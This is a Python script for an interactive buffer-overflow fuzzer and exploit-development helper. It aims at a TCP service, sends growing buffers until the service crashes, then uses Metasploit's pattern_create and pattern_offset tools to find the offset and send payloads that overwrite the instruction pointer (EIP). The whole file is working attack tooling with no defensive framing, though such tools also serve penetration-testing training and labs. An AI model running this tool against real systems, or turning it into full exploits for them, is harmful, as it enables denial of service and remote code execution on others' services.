import socket
from time import sleep
import sys
from subprocess import Popen, PIPE
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", dest="target", help="target")
parser.add_argument("--port", "-p", dest="port", type=int, default=1337, help="target port")
parser.add_argument("--timout", "-T", dest="timeout", type=int, default=5, help="adjust timeout (default: 5)")
parser.add_argument("--start-at", "-b", dest="start_at", type=int, default=0, help="initial size of buffer")
parser.add_argument("--increase-by", "-a", dest="inc_by", type=int, default=500, help="increase buffer size by (default: 500)")
parser.add_argument("--halt-at", "-H", dest="halt_at", type=int, default=0, help="halt at buffer size")
parser.add_argument("--prefix", "-P", dest="prefix", default = "", help="prefix before buffer")
parser.add_argument('--verbose', "-v", action='store_true')

args = parser.parse_args()

ip = args.target
port = args.port
timeout = args.timeout

prefix = args.prefix.encode()

halt_at_buffer_size = args.halt_at
step_on_halt = True

i = args.start_at
inc_by = args.inc_by

cyclic_pattern = b''
cyclic_offset = 0

stack_offset = 0
buffer_size = 0

verbose = args.verbose

print("[*] Fuzzing - target: {}, port: {}, timeout: {}s".format(ip,port,timeout))
print("[*] Config - start at: {}, increment by: {}".format(i, inc_by))
print("[*] Debug - verbose: {}, halt at: {}, step on halt: {}".format(["Off", "On"][verbose], halt_at_buffer_size, ["Off", "On"][step_on_halt]))
print("[#] Phases: #1 crash, #2 pattern, #3 offset")
print("[#] Phases: #4 stack offset & buffer size")
print("[#] Actions: set inc(rement) <number>, set index <number>")
print("[#] Actions: pattern <length>, offset <pattern>")
print("[#] Actions: c(ontinue), q(uit)")

while True:
   if (len(cyclic_pattern) > 0):
      buffer = cyclic_pattern
      cyclic_pattern = b''
      print("[*] Sending cyclic pattern of {} bytes".format(len(buffer)))
   elif (cyclic_offset > 0):
      buffer = b"A" * cyclic_offset + b"B" * 4
      cyclic_offset = 0
      print("[*] Sending control of EIP with {} bytes".format(len(buffer)))
   elif (stack_offset > 0 and buffer_size > 0):
      buffer = b"A" * stack_offset + b"B" * 4 + b"C" * (buffer_size - stack_offset - 4 - 10) + b"D" * 10
      print("[*] Sending controlled EIP, buffer size of {} bytes".format(len(buffer)))
   else:
      buffer = (b"A" * (i - 10)) + b"B" * 10
#      if (inc_by < 10):
#         buffer = b"A" * 10
#      buffer = b"A" * i + b"B" * 10
      print("[*] Sending buffer of {} bytes".format(len(buffer)))

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.settimeout(timeout)
   try:
      connect = s.connect((ip, port))
      # grap initial banner before input
      resp = s.recv(1024)
      if (verbose == True):
         print("[*] banner: {}".format(resp))
      s.send(prefix + buffer + b"\r\n")
      resp = s.recv(1024)
      if (verbose == True):
         print("[!] response: {}".format(resp))
      s.close()
      sleep(.01)

   except:
      s.close()
      print("[+] Crash on sending '{}' bytes".format(len(buffer)))

      while True:
         # ask for action
         input_txt = input("Restart server and enter <action> (help): ").lower()
         if (input_txt == "help" or input_txt == "?"):
            print("[#] help, q(uit), c(continue)")
            print("[#] pattern <length>, offset <pattern>")
            print("[#] info, set <option> <value>")
            print("[#] * options")
            print("[#]   inc(rement) <number>, index <number>")
            print("[#]   stack offset <size>, buffer size <size>")
            print("[#]   halt at <size>, step on/off")
            print("[#] * Phases: #1 crash, #2 pattern, #3 offset,")
            print("[#]           #4 stack offset & buffer size")
         elif (input_txt == "quit" or input_txt == "q"):
            print("[*] Exiting fuzzer!")
            sys.exit()
         elif (input_txt == "continue" or input_txt == 'c'):
            break
         # output settings
         elif (input_txt.startswith("info") or input_txt == "set"):
            print("[*] index: {}, increment: {}".format(i, inc_by))
            print("[*] stack offset: {}, buffer size: {}".format(stack_offset, buffer_size))
            print("[*] halt at buffer: ({} bytes), step on halt: {}".format(halt_at_buffer_size, ["Off", "On"][step_on_halt]))
            continue
         # set options
         elif (input_txt.startswith("set ")):
            set_option = input_txt[input_txt.index(" ")+1::]
            if (set_option.find(" ") <= 0):
               print("[!] invalid option format '{}'".format(set_option))
               continue
            set_value = set_option[set_option.rindex(" ")+1::]
            set_option = set_option[0:set_option.rindex(" ")]
            if (set_option == "increment" or set_option == "inc"):
               if (set_value.isnumeric()):
                  inc_by = int(set_value)
                  print("[*] Set 'increment' by {}".format(inc_by))
            elif (set_option == "index" or set_option == "i"):
               if (set_value.isnumeric()):
                  i = int(set_value)
                  print("[*] Set 'index' at {}".format(i))
            elif (set_option == "halt at"):
               if (set_value.isnumeric()):
                  halt_at_buffer_size = int(set_value)
                  print("[*] Set 'halt' on buffer {}".format(halt_at_buffer_size))
            elif (set_option == "step"):
               if (set_value == "on"):
                  step_on_halt = True
                  print("[*] Enabled 'step on halt'")
               elif (set_value == "off"):
                  step_on_halt = False
                  print("[*] Disabled 'step on halt'") 
               else:
                  print("[!] invalid value type '{}'".format(set_value))
            elif (set_option == "verbose"):
               if (set_value == "on"):
                  verbose = True
                  print("[*] Enabled 'verbose'")
               elif (set_value == "off"):
                  verbose = False
                  print("[*] Disabled 'verbose'") 
               else:
                  print("[!] invalid value type '{}'".format(set_value))
            else:
              print("[!] invalid option '{}'".format(set_option))
            continue
         # Phase: 2
         elif (input_txt.startswith("pattern ")):
            num = input_txt[input_txt.index(" ")+1::]
            if (num.isnumeric()):
               process = Popen(["msf-pattern_create", "-l", num], stdout=PIPE)
               (output, err) = process.communicate()
               exit_code = process.wait()
               cyclic_pattern = output.strip()
               break
            else:
               print("[!] Unknown pattern number '{}'".format(num))
               continue
         # Phase: 3
         elif (input_txt.startswith("offset ")):
            offset_value = input_txt[input_txt.index(" ")+1::]
            process = Popen(["msf-pattern_offset", "-q", offset_value], stdout=PIPE)
            (output, err) = process.communicate()
            exit_code = process.wait()
            cyclic_offset = str(output.strip())
            cyclic_offset = int(cyclic_offset[cyclic_offset.rindex(" ")+1:-1])
            print("[+] Cyclic offset at {} bytes".format(cyclic_offset))
            break
         # Phase: 4
         elif (input_txt.startswith("stack offset ")):
            set_value = input_txt[input_txt.rindex(" ")+1::]
            if (set_value.isnumeric()):
               stack_offset = int(set_value)
               print("[*] Stack Offset -> {}".format(stack_offset))
            else:
               print("[!] invalid value type '{}'".format(set_value))
            continue
         elif (input_txt.startswith("buffer size ")):
            set_value = input_txt[input_txt.rindex(" ")+1::]
            if (set_value.isnumeric()):
               buffer_size = int(set_value)
               print("[*] Buffer Size -> {}".format(buffer_size))
            else:
               print("[!] invalid value type '{}'".format(set_value))
            continue
         elif (input_txt.startswith("reset")):
            timeout = args.timeout
            halt_at_buffer_size = args.halt_at
            step_on_halt = True
            inc_by = args.inc_by
            i = args.start_at
            cyclic_pattern = b''
            cyclic_offset = 0
            stack_offset = 0
            buffer_size = 0
            print("[!] Settings reset")
         else:
            print("[!] Unknown command '{}'".format(input_txt))
            continue

   if (stack_offset == 0 and buffer_size == 0):
      if (halt_at_buffer_size > 0 and (i+inc_by == halt_at_buffer_size or (i+inc_by > halt_at_buffer_size and step_on_halt))):
         input_txt = input("Halted before sending buffer ({} bytes) - enter to continue, S(tep) toggle {}: ".format(i+inc_by, ["On", "Off"][step_on_halt])).lower()
         if (input_txt == "step" or input_txt == "s"):
            step_on_halt = not step_on_halt
      i += inc_by
